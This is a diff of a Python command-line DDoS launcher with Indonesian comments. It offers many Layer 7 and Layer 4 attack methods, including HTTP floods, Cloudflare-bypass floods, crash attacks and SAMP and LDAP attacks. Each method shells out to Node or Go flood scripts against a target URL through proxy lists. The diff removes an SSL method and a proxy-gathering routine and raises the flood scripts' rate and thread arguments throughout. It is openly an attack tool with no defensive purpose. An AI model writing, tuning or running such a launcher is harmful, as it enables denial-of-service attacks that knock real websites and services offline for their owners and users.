@@ -114,7 +114,6 @@ def layer7():
     print("➤ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
     print("➤ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
     print("➤ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
-    print("➤ httpssl     : Serangan yang menargetkan komunikasi terenkripsi menggunakan protokol HTTPS/SSL")
     print("➤ h2-hold     : Serangan lebih lama untuk target yang dilindungi Cloudflare")
     print("➤ h2-bypass        : Teknik bypass Cloudflare yang lebih canggih")
     print("➤ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
@@ -172,7 +171,6 @@ def usage():
     print("➤ auto          : auto https://target.com 60")
     print("➤ crash         : crash https://target.com GET")
     print("➤ httpflood     : httpflood https://target.com 15000 get 60")
-    print("➤ httpssl        : httpssl https://target.com port 60")
     print("➤ h2-hold       : h2-hold https://target.com 60")
     print("➤ h2-bypass    : h2-bypass https://target.com 60")
     print("➤ hyper         : hyper https://target.com 60")
@@ -200,32 +198,6 @@ def usage():
     print("➤ samp         : samp 1.1.1.1 7777")
     print("➤ ldap         : ldap 1.1.1.1 port 650 60")
     print("--------------------------------------------------")
-
-# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
-
-# Fungsi getproxy sudah didefinisikan dengan benar di tingkat global
-import os 
-# Pastikan 'os' diimpor jika fungsi ini berada di file yang berbeda
-# Asumsikan clear_screen() dan si() sudah didefinisikan di tempat lain
-
-def getproxy():
-    # Asumsi: clear_screen() dan si() adalah fungsi yang sudah didefinisikan
-    clear_screen()
-    si() 
-    
-    print("Starting proxy collection process...")
-    
-    # 1. Jalankan skrip getproxy.py (Mengambil proxy)
-    # Skrip getproxy.py akan mengambil proxy dan menyimpannya ke proxies.txt
-    os.system('python3 getproxy.py')
-    
-    # Pesan untuk menunjukkan transisi ke tahap selanjutnya
-    print("\n--- Proxy collection successful. Starting validation process (cekproxy.py)... ---")
-    
-    os.system('python3 cekproxy.py')
-    
-    print("\nProxy validation complete.")
-    print("Proxy save succesfull. Please check from proxies.txt")
 
 def clear_screen():
     # Fungsi untuk membersihkan layar
@@ -321,7 +293,6 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
     print(draw_middle_line("LAYER7  ➤ SHOW LAYER7 FOR ATTACK DOMAIN", box_content_width, 'left')) 
     print(draw_middle_line("LAYER4  ➤ SHOW LAYER4 FOR ATTACK IP", box_content_width, 'left')) 
     print(draw_middle_line("USAGE   ➤ SHOW EXAMPLE USAGE PANEL", box_content_width, 'left'))
-    print(draw_middle_line("GETPROXY ➤ UPDATE PROXY", box_content_width, 'left'))
     print(draw_middle_line("CLEAR   ➤ CLEAR TERMINAL", box_content_width, 'left')) 
     print(draw_bottom_border(box_content_width))
 
@@ -345,8 +316,6 @@ def main():
             menu() # Tampilkan kembali menu setelah membersihkan layar
         elif command_lower == "usage": # Kondisi disederhanakan, hapus redundansi
             usage() 
-        elif command_lower == "getproxy": # Kondisi disederhanakan, hapus redundansi
-            getproxy() # Panggilan ke fungsi getproxy() yang didefinisikan di atas
     
 # LAYER 4 METHODS   
 
@@ -664,7 +633,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'python3 https-spoof.py {url} {time} 3')
+                os.system(f'python3 https-spoof.py {url} {time} 32')
                 url = f"{url}"
                 token = "727e8c2fa5b07c"
                 result = get_url_info(url, token)
@@ -673,20 +642,6 @@ def main():
                 print('Usage: https-spoof <url> <time> <threads>')
                 print('Example: https-spoof http://vailon.com 60 500')     
                 
-        elif "httpssl" in cnc:
-            try:
-                url = cnc.split()[1]
-                port = cnc.split()[2]
-                time = cnc.split()[3]               
-                os.system(f'go run stress.go {url} {port} 3 1 {time} 3')
-                url = f"{url}"
-                token = "727e8c2fa5b07c"
-                result = get_url_info(url, token)
-                print(result) 
-            except IndexError:
-                print('Usage: httpssl <url> <port> <time>')
-                print('Example: httpssl https://lol.com 443 60')                             
-        
         elif "slow" in cnc:
             try:
                url, time = cnc.split()[1:3]
@@ -752,7 +707,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf-flood.js {url} {time} 1 3 proxies.txt')          
+               os.system(f'node cf-flood.js {url} {time} 3 32 proxies.txt')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -782,8 +737,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-holdv1.js {url} {time} 1 3 proxies.txt')     
-               os.system(f'node h2-holdv2.js {url} {time} 1 3 proxies.txt')     
+               os.system(f'node h2-holdv1.js {url} {time} 3 32 proxies.txt')     
+               os.system(f'node h2-holdv2.js {url} {time} 3 32 proxies.txt')     
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -813,7 +768,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-bypass.js GET {url} {time} 1 3 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
+               os.system(f'node h2-bypass.js GET {url} {time} 3 32 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -843,7 +798,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                              
-               os.system(f'node cfgas.js {url} {time} 1 3 proxies.txt')
+               os.system(f'node cfgas.js {url} {time} 3 32 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -873,8 +828,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                 
-               os.system(f'node httpbypass {url} {time} 1 3 proxies.txt')
-               os.system(f'node httpbypassv2 {url} {time} 1 3 proxies.txt')
+               os.system(f'node httpbypass {url} {time} 3 32 proxies.txt')
+               os.system(f'node httpbypassv2 {url} {time} 3 32 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -934,8 +889,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node tlsv2 {url} {time} 1 3 proxies.txt')
-               os.system(f'node tlsv3 {url} {time} 1 3 proxies.txt')             
+               os.system(f'node tlsv2 {url} {time} 3 32 proxies.txt')
+               os.system(f'node tlsv3 {url} {time} 3 32 proxies.txt')             
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -965,8 +920,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                      
-               os.system(f'node auto.js {url} {time} 1 3 proxies.txt')
-               os.system(f'node autov2.js {url} {time} 1 3 proxies.txt')
+               os.system(f'node auto.js {url} {time} 3 32 proxies.txt')
+               os.system(f'node autov2.js {url} {time} 3 32 proxies.txt')
 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -996,7 +951,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf.js {url} {time} 3 proxies.txt')
+               os.system(f'node cf.js {url} {time} 32 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1026,7 +981,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node uambypass.js {url} {time} 3 proxies.txt')
+               os.system(f'node uambypass.js {url} {time} 32 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1094,8 +1049,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node httpget GET {url} {time} 1 3 proxies.txt')
-               os.system(f'node httpgetv2 GET {url} {time} 1 3 proxies.txt')
+               os.system(f'node httpget GET {url} {time} 3 32 proxies.txt')
+               os.system(f'node httpgetv2 GET {url} {time} 3 32 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1125,7 +1080,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node http-storm.js {url} {time} 1 3 proxies.txt')
+               os.system(f'node http-storm.js {url} {time} 3 32 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
